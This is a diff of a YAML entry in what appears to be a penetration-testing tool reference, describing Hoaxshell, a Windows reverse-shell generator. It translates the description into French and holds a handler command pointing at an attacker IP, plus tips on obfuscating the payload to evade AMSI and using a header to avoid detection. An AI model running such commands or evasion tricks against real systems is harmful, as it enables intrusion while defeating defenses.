@@ -1,13 +1,13 @@
 ---
 description: |
-  Hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell. Be aware that the default payload is detected by AMSI so obfuscate it with quotes and capitals an d check if against AmsiTrigger.
+  Hoaxshell est un générateur de reverse shell payload pour Windows qui abuse du protocole http(s) pour établir un shell inversé de type balise. Sachez que le payload par défaut est détectée par AMSI, il faut donc l'obscurcir avec des guillemets et des majuscules et vérifier si elle est compatible avec AmsiTrigger.
 
   Command Reference:
-  ```
-  IP address of attacking machine: 10.10.21.14
 
-  -H: standard or custom http header name to avoid detection
-  ```
+    IP address of attacking machine: 10.10.21.14
+
+    -H: standard or custom http header name to avoid detection
+
 command: |
   python3 hoaxshell.py -s 10.10.14.123 -r -H "Authorization"
 
@@ -23,6 +23,7 @@ services:
   - 
 OS:
   - Windows
+  - Approved-tool
 attack_types:
   - Persistence
   - Injection
